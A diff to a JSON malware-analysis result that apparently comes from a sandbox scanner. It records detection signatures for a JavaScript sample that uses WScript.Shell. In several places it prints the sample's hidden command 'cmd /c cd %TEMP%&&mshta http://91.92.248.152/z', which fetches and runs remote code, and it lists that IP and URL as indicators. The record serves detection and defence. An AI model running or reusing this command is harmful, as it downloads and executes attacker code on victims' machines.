@@ -1,16 +1,345 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 0,
-    "sections": []
+    "score": 541,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signatures",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "active_x_object": 10
+          },
+          "signatures": {
+            "active_x_object": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: ActiveXObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[12]()",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "creates_wsh_object": 10
+          },
+          "signatures": {
+            "creates_wsh_object": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: CreatesWshObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[12].Run(\"cmd /c cd %TEMP%&&mshta http://91.92.248.152/z\", 0)",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_cmd_prompt": 10
+          },
+          "signatures": {
+            "runs_cmd_prompt": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsCommandPrompt",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[12].Run(\"cmd /c cd %TEMP%&&mshta http://91.92.248.152/z\", 0)",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_shell": 10
+          },
+          "signatures": {
+            "runs_shell": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "91.92.248.152",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "http://91.92.248.152/z",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/z",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "91.92.248.152"
+              ],
+              "uri": [
+                "http://91.92.248.152/z"
+              ],
+              "uri_path": [
+                "/z"
+              ]
+            }
+          }
+        },
+        "title_text": "MalwareJail extracted the following IOCs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "91.92.248.152",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "http://91.92.248.152/z",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/z",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 13,
+          "score": 500,
+          "score_map": {
+            "wscript_cmd_url": 500
+          },
+          "signatures": {
+            "wscript_cmd_url": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "cmd /c cd %TEMP%&&mshta http://91.92.248.152/z"
+              ]
+            }
+          },
+          "network": {
+            "dynamic": {
+              "ip": [
+                "91.92.248.152"
+              ],
+              "uri": [
+                "http://91.92.248.152/z"
+              ],
+              "uri_path": [
+                "/z"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs extracted from WScript",
+        "zeroize_on_tag_safe": false
+      }
+    ]
   },
   "files": {
-    "extracted": [],
+    "extracted": [
+      {
+        "name": "extracted_wscript.bat",
+        "sha256": "1c4d11614d87ae2436d5a316373a815860033c364bf15f6a14ae1b05207fcb95"
+      }
+    ],
     "supplementary": []
   },
   "results": {
-    "heuristics": [],
-    "tags": {},
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "active_x_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "creates_wsh_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_cmd_prompt"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_shell"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 13,
+        "signatures": [
+          "wscript_cmd_url"
+        ]
+      }
+    ],
+    "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_cmd_url"
+          ],
+          "value": "cmd /c cd %TEMP%&&mshta http://91.92.248.152/z"
+        }
+      ],
+      "network.dynamic.ip": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_cmd_url"
+          ],
+          "value": "91.92.248.152"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_cmd_url"
+          ],
+          "value": "http://91.92.248.152/z"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_cmd_url"
+          ],
+          "value": "/z"
+        }
+      ],
+      "network.static.ip": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "91.92.248.152"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://91.92.248.152/z"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/z"
+        }
+      ]
+    },
     "temp_submission_data": {}
   }
 }
